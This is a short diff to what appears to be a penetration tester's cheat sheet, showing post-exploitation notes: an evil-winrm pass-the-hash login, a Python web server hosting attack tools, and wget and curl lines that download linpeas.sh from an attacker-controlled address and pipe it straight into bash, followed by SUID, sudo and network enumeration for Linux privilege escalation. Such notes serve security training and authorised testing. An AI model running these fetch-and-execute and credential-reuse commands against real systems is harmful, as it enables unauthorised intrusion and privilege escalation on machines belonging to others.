@@ -444,12 +444,13 @@ evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 
 # Post-Exploitation 
 ## Fileserver
-python3 -m http.server 80 -d ~/Downloads/upload
-wget -qO- 192.168.214.128/linux/linpeas.sh | bash
-curl 192.168.214.128/linux/linpeas.sh | bash
+python3 -m http.server 80 -d ~/Upload
 
 ## Linux
 [*] Privilege Escalation
+wget -qO- $MYIP/linux/linpeas.sh | bash
+curl $MYIP/linux/linpeas.sh | bash
+
 find / -perm /4000 2>/dev/null | xargs ls -la
 sudo -l
 netstat -tuln
